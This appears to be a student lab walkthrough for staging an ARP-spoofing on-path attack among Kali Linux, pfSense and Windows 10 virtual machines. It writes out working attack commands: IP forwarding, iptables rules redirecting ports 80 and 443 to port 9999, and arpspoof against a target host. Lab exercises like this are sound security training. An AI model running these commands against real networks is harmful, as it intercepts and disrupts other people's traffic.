# Setting up an On-Path Attack

1. Open your Kali Linux VM.

2. Open the terminal and type in "ifconfig".

<img width="349" alt="image" src="https://github.com/user-attachments/assets/80c452f9-88b5-4e36-9439-424c9b695343" />

Result of Step 2

3. Now switch over to the pfSense VM and type in "8". This is to open the shell.

<img width="226" alt="image" src="https://github.com/user-attachments/assets/46fdcd9e-0db7-49eb-91ab-8689324542bb" />

Result of Step 3

4. Type in "ifconfig em1" to learn more about the IP and MAC address.

<img width="239" alt="image" src="https://github.com/user-attachments/assets/0da664e2-c385-4221-a013-3978bda2447e" />

Result of Step 4

5. Now switch to the Windows 10 VM and open the cmd prompt. From there type in "ipconfig /all". This is to learn the IP and MAC address for the targeted system.

<img width="353" alt="image" src="https://github.com/user-attachments/assets/455183d7-80bb-49cf-8546-46e56f750b29" />

Result of Step 5

6. Now type in "arp -a" in the cmd prompt. This to view the ARP cache. This number should match up with your pfSense VM physical address. 

<img width="251" alt="image" src="https://github.com/user-attachments/assets/d3012aa7-c091-4f97-b15e-3d85c26a2b89" />

Result of Step 6

7. Now switch over to Kali Linux VM and type in "sudo sysctl -w net.ipv4.ip_forward=1"

8. To enable the IP forwarding type in the terminal "sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9999" 

9. Now edit the previous command to include 443 instead of 89. Type in "sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 9999"

10. Now type in "sudo arpspoof -i eth0 -t 10.10.10.100 10.10.10.1".

<img width="366" alt="image" src="https://github.com/user-attachments/assets/0f698eae-405f-432d-95dd-3848e89e0d89" />

Results of step 7-10

11. Now switch over to the Windows 10 VM and type in "arp -a". The address should be the same as the ARP spoofing for Kali Linux. 

12. Now type in Mozilla Firefox in the Windows 10 VM and type in "www.facebook.com" The page will time out multiple times due the ARP spoofing going towards Kali Linux.


